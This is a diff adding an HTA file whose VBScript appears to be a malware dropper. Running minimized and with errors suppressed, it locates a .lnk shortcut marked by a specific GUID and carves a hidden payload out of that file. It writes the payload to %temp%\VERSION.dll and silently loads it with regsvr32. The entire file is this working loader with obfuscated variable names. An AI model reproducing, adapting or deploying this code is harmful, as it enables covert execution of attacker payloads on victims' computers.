@@ -1,0 +1,74 @@
+<HTML>
+<HEAD>
+
+<HTA:APPLICATION ID="AAABBBBCCCCC"
+WINDOWSTATE = "minimize">
+
+<script language="VBScript">
+
+On Error Resume Next
+
+Function F3(v31, v32, v33)
+	On Error Resume Next
+	Dim v34
+	Set v34 = v33.createTextFile(v32, True)
+	If Err.number <> 0 Then
+	Else
+		Set v34 = Nothing
+		With v33.createTextFile(v32)
+			.Write(v31)
+			.Close
+		End With
+	End If
+End Function
+
+V11 = ""
+V12 = replace(AAABBBBCCCCC.commandLine,chr(34),"")
+V13=split(V12," ")
+
+Set V14 = CreateObject("Scripting.FileSystemObject")
+Set V15 = V14.GetFolder(V13(1)).Files
+
+For each V16 In V15
+	if V14.GetExtensionName(V16.Name) = "lnk" then
+		set V112 = V14.GetFile(V16.Name).OpenAsTextStream()
+		text = V112.ReadAll()
+		index = InStr(text,"d4941776-e570-4bc9-9631-3f6b762b2f0f")
+		if index > 0 then
+			V112.close
+			V11 = V16.Name
+			exit for
+		end if
+		V112.close
+	end if
+Next
+
+V17 = CreateObject("WScript.Shell").ExpandEnvironmentStrings("%temp%\VERSION.dll")
+F2 V17
+
+Sub F2(ByVal V21)
+	If Not V14.FolderExists(V21) Then
+		F2 V14.GetParentFolderName(V21)
+		if V14.GetExtensionName(V21) = "" then
+			V14.CreateFolder V21
+		end if
+	End If
+End Sub
+
+V18= CInt(V13(2))
+
+set V19 = V14.GetFile(V11)
+set V110 = V19.OpenAsTextStream()
+V110.Skip(V18)
+V111 = V110.Read(V13(3))
+
+F3 V111, V17, V14
+V110.close
+V14.close
+CreateObject("Shell.Application").ShellExecute "regsvr32.exe","/s " & V17,V13(1),Null,0
+close()
+</script>
+</HEAD>
+<BODY>
+</BODY>
+</HTML>
